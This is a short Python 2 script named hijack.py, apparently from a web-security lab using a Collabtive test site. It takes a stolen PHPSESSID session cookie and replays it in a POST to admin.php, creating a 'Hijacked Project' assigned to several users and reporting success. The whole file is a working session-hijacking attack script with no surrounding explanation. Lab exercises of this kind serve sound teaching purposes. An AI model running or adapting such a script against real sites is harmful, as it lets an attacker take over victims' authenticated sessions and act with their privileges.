#!/usr/env python2
import sys
import urllib2

def main():
    if len(sys.argv) != 2:
        sys.exit('Invalid number of arguments. Usage: python hijack.py <PHPSESSID>')

    phpsessid = sys.argv[1]

    url = 'http://www.xsslabcollabtive.com/admin.php?action=addpro'
    data = 'name=Hijacked+Project&desc=Hijacked+Project&neverdue=neverdue&budget=0&assignto%5B%5D=6&assignto%5B%5D=5&assignto%5B%5D=4&assignto%5B%5D=3&assignto%5B%5D=2&assignto%5B%5D=1&assignme=1'

    req = urllib2.Request(url, data=data)
    req.add_header('Cookie', phpsessid)

    conn = urllib2.urlopen(req)


    if conn.code == 200:
        print 'Success.'


if __name__ == '__main__':
    main()
